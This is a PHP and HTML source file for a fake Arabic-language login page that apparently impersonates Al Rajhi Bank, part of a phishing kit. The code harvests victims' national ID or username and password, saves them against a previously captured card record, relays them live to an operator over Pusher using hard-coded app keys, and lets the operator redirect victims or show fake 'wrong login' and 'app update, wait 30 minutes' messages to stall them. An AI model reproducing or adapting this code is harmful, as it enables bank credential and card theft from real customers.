<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'Rajhi');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'Rajhi'
    ];

    $pusher->trigger('dallahtwo', 'curreneft-page', $dataa);
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'username' => $_POST['username'],
        'password' => $_POST['password'],
        'message' => 'Rajhi',
        'type' => '2'
    );

    $id = $_SESSION['card_id'];
    $userId = $_SESSION['user_id'];
    $updateResult = $User->UpdateCardRajhi($id, $site);
    if ($updateResult) {
        $User->UpdateStatus($userId, 'Rajhi');

        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('temaeen-new', 'update-user-accountt', $data);

        echo "<script>document.location.href='wait-payment.php';</script>";
    }
}
if (isset($_GET['reject'])) {
    $showError = true;
}

if (isset($_GET['done'])) {
    $showError1 = true;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BANK</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }


        .bg-new {
            background: rgb(248, 249, 250);
            background: linear-gradient(90deg, rgba(248, 249, 250, 1) 0%, rgba(210, 210, 210, 1) 100%);
        }

        label {
            font-size: 15px;
        }

        .form-control {
            border-radius: 15px;
            background-color: transparent;
            border: none;
            font-size: 11px;
            font-weight: bold;
        }

        .btn {
            height: 45px;
            border-radius: 11px;
        }

        .btn-success {
            background-color: #ee7203;
            border-color: #ee7203;
        }


        #loader {
            display: none;
        }


        .loader-container {
            position: fixed;
            /* Fix it to the viewport */
            top: 0;
            /* Align it to the top */
            left: 0;
            /* Align it to the left */
            width: 100%;
            /* Take up the full width */
            height: 100%;
            /* Take up the full height */
            display: flex;
            /* Use flexbox */
            justify-content: center;
            /* Center horizontally */
            align-items: center;
            /* Center vertically */
            background: rgba(255, 255, 255, 0.5);
            /* Optional: Light background to dim the page */
            z-index: 9999;
            /* Ensure it's on top of other content */
        }

        .loader {
            width: 50px;
            aspect-ratio: 1;
            border-radius: 50%;
            border: 8px solid;
            border-color: #4b5055 #0000;
            animation: l1 1s infinite;
        }

        @keyframes l1 {
            to {
                transform: rotate(.5turn)
            }
        }

        .group {
            height: 47px;
            border-radius: 12px;
            border: none;
            display: flex;
            align-items: center;
            padding: 0px 10px 0px 10px;
            gap: 8px;
            border: 1px solid rgba(98, 104, 110, 0.75);
        }

        .form-control:hover {
            background-color: transparent;
            box-shadow: none;
        }

        .form-control:focus {
            background-color: transparent;
            box-shadow: none;
        }

        /* Darken the backdrop when modal is active */
        .modal-backdrop.show {
            background-color: rgba(0, 0, 0, 0.6) !important;
            /* Black background with opacity */
        }

        .modal {
            overflow: hidden;
            border-radius: 55px !important;
        }

        .modal-body,
        .modal-header,
        .modal-footer {
            border: none !important;
        }

        .text-info {
            color: rgb(183, 153, 97) !important;
        }

        ::placeholder {
            color: rgb(182, 180, 180) !important;
        }

        .text-warning {
            color: #ee7203 !important;
        }

        .btn-primary {
            background-color: #221afb !important;
            border-color: #221afb !important;
            ;
        }

        .text-primary {
            color: #221afb !important;
        }
    </style>
</head>

<body class="bg-white">
    <div class="loader-container" id="loader">
        <div class="loader"></div>
    </div>
    <nav class="text-center" style="padding-top: 80px;">
        <img src="./assets/1120.SR-c9b1fd11.png" style="width: 20%;" class="img-fluid" alt="">
        <div style="text-align: center; margin-bottom: 10px;">
    <img src="https://i.postimg.cc/V6bFfMCR/IMG-6271.png" 
         alt="Logo" 
         style="width: 120px; max-width: 100%;">
</div>
        <h6 class="fw-bold mt-4 text-dark">مرحبا بك</h6>
        <h3 class="fw-bold mt-4 text-primary">بالتجربة الرقمية الأفضل</h3>
    </nav>

    <form action="" method="POST" onsubmit="return subb()" style="margin-top: 50px;">

        <div class="px-4">
            <div class="group mt-3">
                <!-- <i class="fa-solid fa-user text-muted text-dark fs-5"></i> -->
                <input type="text" name="username" required class="form-control" placeholder="أدخل الهوية الوطنية أو اسم المستخدم">

            </div>

            <div class="group mt-3">
                <!-- <i class="fa-solid fa-lock text-muted fs-5 text-dark"></i> -->
                <input type="password" name="password" id="password" required class="form-control" placeholder="أدخل كلمة المرور">
                <div class="d-flex align-items-center gap-3 ps-3">
                    <i class="fa-solid fa-eye-slash text-muted text-dark" id="eye" style="font-size:13px;"></i>
                </div>
            </div>


            <!-- <div class="d-flex align-items-center mt-2 gap-2">
                <small for="" class="pt-2"><a href="./info.php?forget=1" class="fw-bold text-muted" style="font-size: 11px;">نسيت كلمة المرور ؟</a></small>
            </div> -->
            <?php
            if (isset($showError)) {
                echo "<script>
                $(document).ready(function() {
                    $('#exampleModalToggle').modal('show');
                });
            </script>";
            }
            ?>

            <?php
            if (isset($showError1)) {
                echo "<script>
                $(document).ready(function() {
                    $('#exampleModalToggle1').modal('show');
                });
            </script>";
            }
            ?>

            <div class="text-center mt-5">
                <button type="submit" name="submit" id="subs" class="btn btn-primary pb-2 w-100">تسجيل الدخول</button>
            </div>
            <!-- <div class="text-center mt-3">
                <small class="text-muted"><a href="./info.php" class="fw-bold text-dark" style="font-size: 11px;">غير مشترك بالخدمات الإلكترونية؟ <span class="text-muted">سجل الان</span></a></small>
            </div> -->

            <div class="modal fade px-4" id="exampleModalToggle" aria-hidden="true" aria-labelledby="exampleModalToggleLabel" tabindex="-1">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content p-3" style="border-radius: 20px !important;">
                        <div class="modal-header d-block">
                            <button type="button" class="btn-close float-start" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body text-center">
                            <img src="./assets/error_msg.png" alt="">
                            <h5 class="mt-5 fw-bold">خطأ</h5>
                            <p class="mt-4">معلومات دخول خاطئة</p>
                        </div>
                        <div class="modal-footer d-block text-center mb-3">
                            <button class="btn w-75 btn-primary" data-bs-target="#exampleModalToggle2" data-bs-toggle="modal">تم</button>
                        </div>
                    </div>
                </div>
            </div>

            <div class="modal fade px-4" id="exampleModalToggle1" aria-hidden="true" aria-labelledby="exampleModalToggleLabel" tabindex="-1">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content p-3" style="border-radius: 20px !important;">
                        <div class="modal-header d-block">
                            <button type="button" class="btn-close float-start" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body text-center">
                            <img src="./assets/error_msg.png" alt="">
                            <p class="mt-4">يوجد تحديث على التطبيق البنكي لمدة <br> 30 دقيقة الرجاء محاولة إعادة التسجيل بعد إنتهاء مدة 30 دقيقة</p>
                        </div>
                        <div class="modal-footer d-block text-center mb-3">
                            <button class="btn w-75 btn-success" data-bs-target="#exampleModalToggle2" data-bs-toggle="modal">تم</button>
                        </div>
                    </div>
                </div>
            </div>

        </div>

    </form>
<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>
    <script>
        function subb() {
            var but = document.getElementById('subs');
            but.style.display = 'none';

            document.getElementById('loader').style.display = "flex";
        }

        document.getElementById("eye").addEventListener("click", function() {
            var input = document.getElementById("password");

            if (input.type === "text") {
                input.type = "password";
            } else {
                input.type = "text";
            }
        });
    </script>

</body>

</html>